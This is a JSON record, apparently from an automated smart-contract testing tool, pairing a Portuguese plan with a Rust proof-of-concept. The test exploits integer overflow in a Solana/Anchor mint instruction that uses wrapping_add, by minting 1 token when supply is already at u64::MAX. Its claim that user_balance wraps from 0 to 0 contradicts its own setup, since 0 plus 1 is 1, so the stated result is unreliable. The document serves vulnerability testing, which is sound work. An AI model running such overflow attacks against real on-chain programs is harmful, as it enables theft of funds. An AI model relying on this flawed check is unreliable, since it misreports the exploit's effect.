{
  "plan": "Inicializamos o ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chamamos mint com amount = 1, que deveria causar overflow se o programa usasse checked_add, mas usa wrapping_add. O efeito medido é que total_supply e user_balance deram a volta para 0, confirmando a vulnerabilidade de overflow.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Baseline: inicializa o ledger com total_supply = u64::MAX
let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize ledger with max supply", &init_ix, &init_accounts);
assert_eq!(baseline_result.program_result, ProgramResult::Success);

// Extrai a conta ledger resultante do baseline
let ledger_account = baseline_result.resulting_accounts.iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .expect("ledger account not found");

// Ataque: mint com amount = 1, causando overflow em total_supply e user_balance
let attack_ix = env.anchor_ix(
    "mint",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (ledger_key, ledger_account),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("mint 1 with total_supply = u64::MAX", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_after = after(&attack_result, &ledger_key);
    let data = ledger_after.data();
    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance
    let total_supply_after = read_u64(data, 40);
    let user_balance_after = read_u64(data, 48);
    env.effect(
        "total_supply deu a volta para 0 (overflow)",
        total_supply_after == 0,
    );
    env.effect(
        "user_balance deu a volta para 0 (overflow)",
        user_balance_after == 0,
    );
}"
}

